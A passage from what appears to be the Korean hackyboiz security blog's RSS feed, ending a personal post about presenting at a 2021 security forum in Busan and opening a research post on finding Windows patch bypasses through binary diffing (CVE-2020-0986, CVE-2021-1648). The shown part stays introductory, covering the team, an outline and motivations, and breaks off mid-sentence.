&#xC815;&#xB3C4;&#xB97C; &#xB0A0;&#xC544; &#xAE40;&#xD574;&#xACF5;&#xD56D;&#xC5D0; &#xB3C4;&#xCC29;&#xD588;&#xC5B4;&#xC694;. &#xC804;&#xC5ED;&#xC5EC;&#xD589; &#xC774;&#xD6C4;&#xB85C; &#xB450; &#xBC88;&#xC9F8;&#xB85C; &#xC624;&#xB294; &#xBD80;&#xC0B0;!.. &#xC744; &#xB290;&#xB084; &#xC0C8;&#xB3C4; &#xC5C6;&#xC774; &#xBC14;&#xB85C; &#xBCA1;&#xC2A4;&#xCF54;&#xB85C; &#xD5A5;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#x3160;&#x3160; </p><p><img src="/2021/09/08/l0ch/securityone_forum_review/Screen_Shot_2021-09-07_at_16.59.38.png" alt="Screen Shot 2021-09-07 at 16.59.38.png"></p><blockquote><p>&#xB098; &#xC0AC;&#xC9C4; &#xC9C4;&#xC9DC; &#xBABB;&#xCC0D;&#xB124;..? <del>PEXCO &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;</del></p></blockquote><p>&#xBCA1;&#xC2A4;&#xCF54;&#xC5D0; &#xB3C4;&#xCC29;&#xD558;&#xB2C8; &#xC810;&#xC2EC;&#xC2DC;&#xAC04;&#xC774;&#xB77C; &#xBC30;&#xB3C4; &#xACE0;&#xD320;&#xACE0; &#xC2DC;&#xAC04;&#xB3C4; &#xC880; &#xB0A8;&#xC544;&#xC11C; &#xBC25;&#xBD80;&#xD130; &#xBA39;&#xC5C8;&#xC5B4;&#xC694;.</p><p><img src="/2021/09/08/l0ch/securityone_forum_review/Screen_Shot_2021-09-07_at_20.54.22.png" alt="Screen Shot 2021-09-07 at 20.54.22.png"></p><blockquote><p>&#xBD80;&#xC0B0;&#xAC00;&#xBA74; &#xBB50;&#xB2E4;? &#xB3FC;&#xC9C0;&#xAD6D;&#xBC25;&#xC774;&#xB2E4;! &#xC5EC;&#xAE30; &#xC874;&#xB9DB;&#xC774;&#xC5D0;&#xC694; &#x3139;&#x3147; &#xAF2D;&#xAC00;&#xC2ED;&#xC1FC;</p></blockquote><p><img src="/2021/09/08/l0ch/securityone_forum_review/Screen_Shot_2021-09-07_at_16.49.09.png" alt="Screen Shot 2021-09-07 at 16.49.09.png"></p><blockquote><p>&#xB098; &#xC774;&#xAC70; &#xBA39;&#xC73C;&#xB824;&#xACE0; &#xBD80;&#xC0B0;&#xC654;&#xB124;</p></blockquote><p>&#xB2E4;&#xB300;&#xAE30; &#xB300;&#xC2E0; &#xC308;&#xC7A5;&#xC744; &#xB123;&#xC5B4; &#xC8FC;&#xB358;&#xB370; &#xBD80;&#xC0B0; &#xD2B9;&#xC0C9;&#xC778;&#xAC00;&#xC694;? &#xC544;&#xB2C8;&#xBA74; &#xC774; &#xAC00;&#xAC8C;&#xB9CC;&#xC758; &#xB808;&#xC2DC;&#xD53C;&#xC778;&#xAC00;&#xC694;? &#xC544;&#xBB34;&#xD2BC; &#xC5C4;&#xCCAD; &#xB9DB;&#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/l0ch/securityone_forum_review/Screen_Shot_2021-09-07_at_16.48.47.png" alt="Screen Shot 2021-09-07 at 16.48.47.png"></p><blockquote><p>&#xB3C4;&#xCC29;&#xD558;&#xC790;&#xB9C8;&#xC790; &#xD654;&#xC7A5;&#xC2E4; &#xAE09;&#xD558;&#xB2E4;&#xACE0; &#xC0AC;&#xB77C;&#xC9C4; Fabu1ous &#xAE30;&#xB2E4;&#xB9AC;&#xBA74;&#xC11C;</p></blockquote><p>&#xD655;&#xC2E4;&#xD788; &#xCF54;&#xB85C;&#xB098;&#xB77C;&#xC11C; &#xBCA1;&#xC2A4;&#xCF54;&#xC5D0;&#xC11C; &#xD558;&#xB294; &#xD589;&#xC0AC;&#xAC00; &#xBAA8;&#xB450; &#xBE44;&#xB300;&#xBA74;&#xC73C;&#xB85C; &#xC9C4;&#xD589;&#xB418;&#xB354;&#xB77C;&#xAD6C;&#xC694;. &#xBD81;&#xC801;&#xBD81;&#xC801;&#xD574;&#xC57C; &#xC7AC;&#xBC0C;&#xB294;&#xB370; &#xC544;&#xC26C;&#xC6E0;&#xC2B5;&#xB2C8;&#xB2E4;&#x3160;&#x3160; &#xB2E4;&#xC74C;&#xC5D0; &#xB610; &#xBC1C;&#xD45C;&#xD560; &#xAE30;&#xD68C;&#xAC00; &#xC788;&#xB2E4;&#xBA74; &#xADF8;&#xB54C;&#xB294; &#xC0C1;&#xD669;&#xC774; &#xC880; &#xB354; &#xB098;&#xC544;&#xC84C;&#xC73C;&#xBA74; &#xC88B;&#xACA0;&#xB124;&#xC694;.</p><p>&#xC900;&#xBE44;&#xAE30;&#xAC04;&#xC774; &#xC870;&#xAE08; &#xC9E7;&#xC544;&#xC11C; &#xC544;&#xC26C;&#xC6B4; &#xC810;&#xB3C4; &#xC788;&#xC5C8;&#xC9C0;&#xB9CC; &#xB2E4;&#xD589;&#xD788; &#xBC1C;&#xD45C;&#xB294; &#xD070; &#xC2E4;&#xC218; &#xC5C6;&#xC774; &#xBB34;&#xC0AC;&#xD788; &#xB9C8;&#xCE60; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB978; &#xBC1C;&#xD45C;&#xC790;&#xBD84;&#xB4E4;&#xC774; &#xBC1C;&#xD45C;&#xD558;&#xC2E0; &#xB2E4;&#xB978; &#xC88B;&#xC740; &#xC8FC;&#xC81C;&#xB4E4;&#xB3C4; &#xC9C1;&#xC811; &#xBCFC; &#xC218; &#xC788;&#xC5B4; &#xC88B;&#xC740; &#xACBD;&#xD5D8;&#xC774; &#xB418;&#xC5C8;&#xB124;&#xC694;. </p><p>&#xC774;&#xBC88; &#xD3EC;&#xB7FC;&#xC744; &#xC900;&#xBE44;&#xD574;&#xC8FC;&#xC2E0; &#xC2A4;&#xD0F6;&#xBD84;&#xB4E4;, &#xADF8;&#xB9AC;&#xACE0; &#xC800;&#xD76C; &#xD300;&#xC5D0; &#xAD00;&#xC2EC;&#xC744; &#xAC00;&#xC838;&#xC8FC;&#xC2E0; 2021 &#xC0AC;&#xC774;&#xBC84; &#xBCF4;&#xC548; &#xCEE8;&#xD37C;&#xB7F0;&#xC2A4; &#xCC38;&#xC5EC;&#xC790;&#xBD84;&#xB4E4; &#xBAA8;&#xB450; &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;!</p><p><img src="/2021/09/08/l0ch/securityone_forum_review/Untitled%202.png" alt="Untitled"></p><p>&#xC548;&#xB155;!</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Daily-Life/">Daily-Life</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/security-one/">security one</category>
      
      <category domain="https://hackyboiz.github.io/tags/daily/">daily</category>
      
      <category domain="https://hackyboiz.github.io/tags/gookbab/">gookbab</category>
      
      <category domain="https://hackyboiz.github.io/tags/review/">review</category>
      
      
      <comments>https://hackyboiz.github.io/2021/09/08/l0ch/securityone_forum_review/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Windows 1-day patch 분석 및 bypass with diffing</title>
      <link>https://hackyboiz.github.io/2021/09/08/l0ch/windows_1-day_patch_diffing/</link>
      <guid>https://hackyboiz.github.io/2021/09/08/l0ch/windows_1-day_patch_diffing/</guid>
      <pubDate>Wed, 08 Sep 2021 13:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2021/09/08/l0ch/windows_1-day_patch_diffing/1-1.png&quot; alt=&quot;1-1.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;, &amp;#xC624;&amp;</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/1-1.png" alt="1-1.png"></p><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;, &#xC624;&#xB298;&#xC740; 2021 &#xC0AC;&#xC774;&#xBC84; &#xBCF4;&#xC548; &#xCEE8;&#xD37C;&#xB7F0;&#xC2A4;&#xC5D0;&#xC11C; &#xBC1C;&#xD45C;&#xD55C; &#xBC1C;&#xD45C;&#xC790;&#xB8CC;&#xB97C; &#xB4E4;&#xACE0; &#xC654;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC8FC;&#xC81C;&#xB294; Windows 1-day patch&#xB97C; binary diffing&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD558;&#xACE0; bypass &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC790;! &#xC778;&#xB370;&#xC694;, &#xC608;&#xC804;&#xC5D0; &#xC62C;&#xB838;&#xB358; &#xC544;&#xB798; &#xC5F0;&#xAD6C;&#xAE00;&#xC5D0;&#xC11C; &#xD588;&#xB358; &#xC8FC;&#xC81C;&#xC5D0; &#xB0B4;&#xC6A9;&#xC744; &#xC880; &#xB354; &#xCD94;&#xAC00;&#xD574;&#xC11C; &#xBC1C;&#xD45C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><a href="https://hackyboiz.github.io/2020/11/15/l0ch/windows-patch-diffing-part1/">[Research] Windows Patch Diffing &#xB9DB;&#xBCF4;&#xAE30; Part 1</a> </p><p><a href="https://hackyboiz.github.io/2020/11/29/l0ch/windows-patch-diffing-part2/">[Research] Windows Patch Diffing &#xB9DB;&#xBCF4;&#xAE30; Part 2</a> </p><p>&#xD6C4;&#xAE30;&#xB294; <a href="https://hackyboiz.github.io/2021/09/08/l0ch/securityone_forum_review/">[Daily-Life] &#xBD80;&#xC0B0;&#xAE4C;&#xC9C0; &#xAC00;&#xC11C; &#xBC1C;&#xD45C;&#xD55C; &#xC370; &#xD47C;&#xB2E4;, &#xC2DC;&#xC6D0;&#xD3EC;&#xB7FC; &#xBC1C;&#xD45C; &#xD6C4;&#xAE30;</a> &#xC5D0;&#xC11C; &#xBCF4;&#xC2E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. ! </p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/2-1.png" alt="2-1.png"></p><p>&#xC81C; &#xC18C;&#xAC1C;&#xB294; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#x314E;&#x314E;&#x2026; </p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/3-1.png" alt="3-1.png"></p><p>&#xBC1C;&#xD45C;&#xC5D0;&#xC11C; &#xC800;&#xD76C; &#xD300;&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB3C4; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC18C;&#xAC1C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBE14;&#xB85C;&#xADF8;&#xB97C; &#xBCF4;&#xC2DC;&#xB294; &#xBD84;&#xB4E4;&#xC5D0;&#xAC8C;&#xB3C4; &#xC800;&#xD76C;&#xAC00; &#xC5B4;&#xB5A4; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xD558;&#xACE0; &#xC788;&#xB294;&#xC9C0; &#xC815;&#xD655;&#xD788; &#xC54C;&#xB824;&#xB4DC;&#xB9AC;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xC18C;&#xAC1C;&#xD55C; &#xB0B4;&#xC6A9;&#xC744; &#xADF8;&#xB300;&#xB85C; &#xAC00;&#xC838;&#xC640;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs erlang">&#xD300;&#xBA85;&#xC778; Hackyboiz&#xB294; Hacking&#xACFC; boiz&#xB77C;&#xB294; &#xC758;&#xBBF8;&#xB85C; &#xCD5C;&#xC2E0; &#xD574;&#xD0B9;&#xD2B8;&#xB80C;&#xD2B8;&#xB97C; &#xD314;&#xB85C;&#xC5C5;&#xD558;&#xBA70; &#xACF5;&#xBD80;&#xD558;&#xB294; &#xD300;&#xC785;&#xB2C8;&#xB2E4;.&#xC800;&#xD76C;&#xB294; &#xD604;&#xC7AC; &#xBE14;&#xB85C;&#xADF8;&#xC640; &#xB274;&#xC2A4;&#xB808;&#xD130;&#xB97C; &#xC6B4;&#xC601;&#xC911;&#xC774;&#xBA70; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB418;&#xB294; &#xB0B4;&#xC6A9;&#xB4E4;&#xC744; &#xD398;&#xC774;&#xC2A4;&#xBD81;&#xACFC; &#xC778;&#xC2A4;&#xD0C0;&#xC5D0; &#xACF5;&#xC720;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800; &#xBE14;&#xB85C;&#xADF8;&#xB294; <span class="hljs-number">2</span>~<span class="hljs-number">3</span>&#xB144;&#xC815;&#xB3C4;  &#xD574;&#xD0B9;&#xC744; &#xACF5;&#xBD80;&#xD558;&#xC2E0; &#xBD84;&#xB4E4;&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xCEE8;&#xD150;&#xCE20;&#xB97C; &#xC5C5;&#xB85C;&#xB4DC;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.&#xD558;&#xB8E8;&#xD55C;&#xC904; -&#xA0;&#xCD5C;&#xADFC; &#xC774;&#xC288;&#xD654;&#xB418;&#xAC70;&#xB098; &#xACF5;&#xAC1C;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xAE30;&#xC220;&#xC801;&#xC778; &#xC815;&#xBCF4;&#xB97C; &#xC9E7;&#xAC8C; &#xC815;&#xB9AC;&#xD55C; &#xAE00;&#xD574;&#xD0A4;&#xD53C;&#xB514;&#xC544; - &#xBCF4;&#xC548;&#xACFC; &#xCEF4;&#xD4E8;&#xD130;&#xB97C; &#xACF5;&#xBD80;&#xD558;&#xBA70; &#xC9C0;&#xB098;&#xCE58;&#xAE30; &#xC26C;&#xC6B4; &#xCEF4;&#xD4E8;&#xD130; &#xC9C0;&#xC2DD;&#xB4E4;&#xC744;&#xA0;&#xC774;&#xD574;&#xD558;&#xAE30; &#xC27D;&#xAC8C; &#xC124;&#xBA85;&#xD55C; &#xBC31;&#xACFC;&#xC0AC;&#xC804;&#xC5F0;&#xAD6C; &#xBC0F;&#xA0;&#xBC88;&#xC5ED;&#xAE00; -&#xA0;&#xD300;&#xC6D0;&#xB4E4; &#xAC1C;&#xAC1C;&#xC778;&#xC774; &#xBAA9;&#xD45C;&#xB97C; &#xC124;&#xC815;&#xD558;&#xACE0; &#xACF5;&#xBD80; &#xBC0F; &#xC5F0;&#xAD6C;&#xD558;&#xB294; &#xB0B4;&#xC6A9;&#xC744; &#xC5C5;&#xB85C;&#xB4DC;&#xD574;&#xD0B9;&#xC9F9;&#xC9F9; &#xB274;&#xC2A4;&#xB808;&#xD130;&#xB294; &#xB9E4; &#xC8FC; &#xC6D4;, &#xC218;, &#xAE08;&#xB9C8;&#xB2E4; &#xD574;&#xD0B9;/&#xBCF4;&#xC548; &#xC52C;&#xC758; &#xB3D9;&#xD5A5;, &#xD574;&#xD0B9;&#xAE30;&#xBC95; &#xC124;&#xBA85;, &#xD574;&#xCEE4;&#xC758; &#xBB38;&#xD654;&#xAC19;&#xC774; &#xD574;&#xD0B9;&#xC5D0; &#xAD00;&#xC2EC;&#xC774; &#xC788;&#xC73C;&#xC2DC;&#xBA74; &#xC804;&#xBB38;&#xC801;&#xC778; &#xC9C0;&#xC2DD; &#xC5C6;&#xC774;&#xB3C4; &#xC7AC;&#xBC0C;&#xAC8C; &#xC77D;&#xC744; &#xC218; &#xC788;&#xB294; &#xB2E4;&#xC591;&#xD55C; &#xCEE8;&#xD150;&#xCE20;&#xB97C; &#xBCF4;&#xB0B4;&#xB4DC;&#xB9AC;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</code></pre><p>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xD300;&#xC6D0; &#xBAA8;&#xC9D1;&#xB3C4; &#xD558;&#xACE0; &#xC788;&#xB2E4;&#xB294; &#xC774;&#xC57C;&#xAE30;&#xB3C4; &#xD588;&#xC5C8;&#xB294;&#xB370;&#xC694;, &#xD300;&#xC6D0; &#xBAA8;&#xC9D1;&#xC740; &#xD604;&#xC7AC; &#xC9C4;&#xD589;&#xD615;&#xC774;&#xB2C8; &#xAD00;&#xC2EC;&#xC774; &#xC788;&#xC73C;&#xC2DC;&#xB2E4;&#xBA74; &#xC5B8;&#xC81C;&#xB4E0; &#xD398;&#xC774;&#xC2A4;&#xBD81; &#xBA54;&#xC2DC;&#xC9C0;&#xB098; &#xBE14;&#xB85C;&#xADF8; &#xC18C;&#xAC1C;&#xB780;&#xC758; &#xC774;&#xBA54;&#xC77C;&#xB85C; &#xC5F0;&#xB77D;&#xC8FC;&#xC138;&#xC694;!</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/4-1.png" alt="4-1.png"></p><p>&#xBAA9;&#xCC28;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>Windows&#xC758; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xC640; Patch Tuesday</li><li>binary diffing&#xC73C;&#xB85C; Windows Patch &#xBD84;&#xC11D;&#xD558;&#xAE30;</li><li>Windows&#xC758; Delta Patch</li><li>&#xD504;&#xB9B0;&#xD130; &#xC2A4;&#xD480;&#xB7EC; &#xC11C;&#xBE44;&#xC2A4; &#xCDE8;&#xC57D;&#xC810; CVE-2020-0986&#xACFC; bypass &#xCDE8;&#xC57D;&#xC810; CVE-2021-1648 &#xBD84;&#xC11D;</li></ul><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/5-1.png" alt="5-1.png"></p><p>Windows&#xB294; &#xC815;&#xAE30;&#xC801;&#xC73C;&#xB85C; &#xBCF4;&#xC548; &#xD328;&#xCE58;&#xB97C; &#xD3EC;&#xD568;&#xD55C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xB294;&#xB370;, &#xB9E4; &#xB2EC; &#xB458;&#xC9F8; &#xC8FC; &#xD654;&#xC694;&#xC77C;&#xC5D0; &#xC9C4;&#xD589;&#xB41C;&#xB2E4;&#xACE0; &#xD574; Patch Tuesday&#xB77C;&#xB294; &#xC774;&#xB984;&#xC774; &#xBD99;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Windows&#xB294; &#xAE30;&#xB2A5;&#xC774; &#xB9CE;&#xC740; &#xB9CC;&#xD07C; &#xBC84;&#xADF8;&#xB3C4; &#xB9CE;&#xC744; &#xAC70;&#xACE0;, &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xADF8;&#xC5D0; &#xB530;&#xB77C; &#xB2F9;&#xC5F0;&#xD788; &#xB9CE;&#xC744; &#xC218;&#xBC16;&#xC5D0; &#xC5C6;&#xC8E0;. &#xCD5C;&#xADFC; &#xBA87; &#xB2EC;&#xAC04; Patch Tuesday &#xD55C; &#xBC88;&#xC5D0; &#xD328;&#xCE58;&#xB418;&#xB294; &#xBCF4;&#xC548; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC57D; 100&#xAC1C;&#xAC00; &#xB118;&#xB294;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/6-1.png" alt="6-1.png"></p><p>&#xC624;&#xB298;&#xC740; &#xC774; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; &#xBCF4;&#xC548; &#xCDE8;&#xC57D;&#xC810; &#xD328;&#xCE58;&#xB97C; Binary Diffing&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC5EC;&#xAE30;&#xC11C; &#xC758;&#xBB38;&#xC810;&#xC774; &#xB4E4; &#xC218; &#xC788;&#xB294;&#xB370;, &#xAD73;&#xC774; &#xC81C;&#xBCF4;&#xB418;&#xACE0; &#xD328;&#xCE58;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xC774;&#xC720;&#xAC00; &#xC788;&#xC744;&#xAE4C;&#xC694;? </p><p>&#xC5EC;&#xAE30;&#xC5D0; &#xB300;&#xD55C; &#xB2F5;&#xBCC0;&#xC740; &#xC138; &#xAC00;&#xC9C0;&#xB85C; &#xC774;&#xC57C;&#xAE30;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/7-1.png" alt="7-1.png"></p><p>&#xCCAB; &#xBC88;&#xC9F8;&#xB85C; &#xBCF4;&#xC548;&#xC744; &#xACF5;&#xBD80;&#xD558;&#xB294; &#xBD84;&#xB4E4;&#xC774;&#xB77C;&#xBA74; &#xC54C;&#xACE0; &#xACC4;&#xC2DC;&#xB4EF;&#xC774;, &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xC5BB;&#xACE0; &#xACF5;&#xBD80;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xC785;&#xB2C8;&#xB2E4;. &#xBCF4;&#xD1B5; &#xCDE8;&#xC57D;&#xC810; &#xC720;&#xD615;&#xC744; &#xC6CC;&#xAC8C;&#xC784;&#xC744; &#xD1B5;&#xD574; &#xACF5;&#xBD80;&#xD558;&#xACE4; &#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC6CC;&#xAC8C;&#xC784; &#xD658;&#xACBD; &#xC0C1; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC720;&#xD615;&#xC774; &#xD55C;&#xC815;&#xC801;&#xC77C; &#xC218;&#xBC16;&#xC5D0; &#xC5C6;&#xC8E0;. &#xADF8;&#xB798;&#xC11C; &#xB9AC;&#xC5BC;&#xC6D4;&#xB4DC; &#xBD84;&#xC11D; &#xACBD;&#xD5D8;&#xC744; &#xC313;&#xAE30; &#xC704;&#xD574; 1-day&#xB97C; &#xBD84;&#xC11D;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xB450; &#xBC88;&#xC9F8;&#xB85C;&#xB294; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xBCA4;&#xB354;&#xC0AC;&#xB4E4;&#xC774; &#xCDE8;&#xC57D;&#xC810; &#xC720;&#xD615;&#xBCC4; &#xD328;&#xCE58;&#xC5D0; &#xB300;&#xD55C; &#xCC38;&#xACE0;&#xC790;&#xB8CC;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574; 1-day&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xAE30;&#xB3C4; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/8-1.png" alt="8-1.png"></p><p>&#xB9C8;&#xC9C0;&#xB9C9; &#xC138; &#xBC88;&#xC9F8;&#xB294; &#xC624;&#xB298;&#xC758; &#xC8FC;&#xC81C;&#xC778; &#xC6B0;&#xD68C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xAC70;&#xB098; &#xC544;&#xC608; &#xC0C8;&#xB85C;&#xC6B4; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. Windows &#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xB2E4;&#xB978; &#xB9CE;&#xC740; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC5ED;&#xC0AC;&#xB97C; &#xBCF4;&#xB354;&#xB77C;&#xB3C4; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xD328;&#xCE58;&#xAC00; &#xCDA9;&#xBD84;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xB418;&#xC9C0; &#xC54A;&#xC740; &#xCC44;&#xB85C; &#xBC30;&#xD3EC;&#xB41C; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xC27D;&#xAC8C;&#xB294; PoC&#xB97C; &#xC0B4;&#xC9DD;&#xB9CC; &#xC218;&#xC815;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC6B0;&#xD68C;&#xAC00; &#xAC00;&#xB2A5;&#xD55C; &#xACBD;&#xC6B0;&#xB3C4; &#xC788;&#xC73C;&#xBA70;, &#xC624;&#xB298; &#xC18C;&#xAC1C;&#xD560; CVE-2020-0986&#xACFC; bypass &#xCDE8;&#xC57D;&#xC810;&#xC778; CVE-2021-1648 &#xC678;&#xC5D0;&#xB3C4; Windows Installer&#xC758; &#xACBD;&#xC6B0; CVE-2019-0841, CVE-2019-1415, CVE-2020-1302, CVE-2020-0814, CVE-2020-16902 &#xB4F1; 5&#xBC88;&#xC774;&#xB098; &#xD328;&#xCE58;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xC0AC;&#xB840;&#xB3C4; &#xC788;&#xC5C8;&#xB358; &#xB9CC;&#xD07C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xB294; &#xBAA9;&#xC801;&#xC73C;&#xB85C;&#xB3C4; 1-day&#xB97C; &#xBD84;&#xC11D;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/9-1.png" alt="9-1.png"></p><p>&#xC774;&#xB807;&#xAC8C; &#xD328;&#xCE58;&#xB85C; &#xCD94;&#xAC00;&#xB41C; &#xCF54;&#xB4DC;&#xC758; &#xAC80;&#xC99D; &#xBBF8;&#xD761;&#xC774;&#xB098; &#xCD94;&#xAC00;&#xB41C; &#xCF54;&#xB4DC; &#xC790;&#xCCB4;&#xC758; &#xB610; &#xB2E4;&#xB978; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD560; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC788;&#xC73C;&#xBA70; &#xC774; &#xBD80;&#xBD84;&#xC744; &#xC911;&#xC810;&#xC73C;&#xB85C; bypass&#xB97C; &#xCC3E;&#xB294;&#xB2E4;&#xBA74; &#xC77C;&#xBC18;&#xC801;&#xC778; &#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xBC29;&#xBC95;&#xC5D0;&#xC11C; &#xBD84;&#xC11D;&#xD560; &#xCF54;&#xB4DC;&#xC758; &#xC591;&#xBCF4;&#xB2E4; &#xD06C;&#xAC8C; &#xC904;&#xC5B4;&#xB4E0;&#xB2E4;&#xB294; &#xC7A5;&#xC810;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/10-1.png" alt="10-1.png"></p><p>1-day &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xC6B0;&#xC120; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xBC84;&#xC804;&#xC758; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xAD6C;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xAE4C;&#xC9C0; &#xD558;&#xB824;&#xBA74; &#xD658;&#xACBD;&#xB3C4; &#xAD6C;&#xC131;&#xD574;&#xC57C; &#xD558;&#xACE0; &#xD328;&#xCE58; &#xBD84;&#xC11D;&#xAE4C;&#xC9C0; &#xD558;&#xB824;&#xBA74; &#xD328;&#xCE58;&#xB41C; &#xBC84;&#xC804;&#xB3C4; &#xB530;&#xB85C; &#xAD6C;&#xD574;&#xC57C;&#xACA0;&#xB124;&#xC694;.</p><p>&#xC5EC;&#xAE30;&#xC11C; &#xBB38;&#xC81C;&#xAC00; &#xC0DD;&#xAE41;&#xB2C8;&#xB2E4;. &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB9CC; &#xD574;&#xB3C4; &#xB9CE;&#xC740;&#xB370; Windows&#xB294; &#xBE4C;&#xB4DC;&#xB098; &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xC5D0; &#xB530;&#xB77C; &#xBC84;&#xC804;&#xC774; &#xB610; &#xB098;&#xB269;&#xB2C8;&#xB2E4;.  &#xAD6C;&#xAE00;&#xB9C1;&#xC744; &#xD574;&#xC11C; &#xCC3E;&#xC544;&#xC57C; &#xD558;&#xB098; &#xC2F6;&#xC5B4;&#xB3C4; &#xC774; &#xB9CE;&#xC740; &#xBC84;&#xC804; &#xC911; &#xB0B4;&#xAC00; &#xC6D0;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xB294; &#xBC84;&#xC804;&#xC774; &#xC5C6;&#xC744; &#xAC00;&#xB2A5;&#xC131;&#xC774; 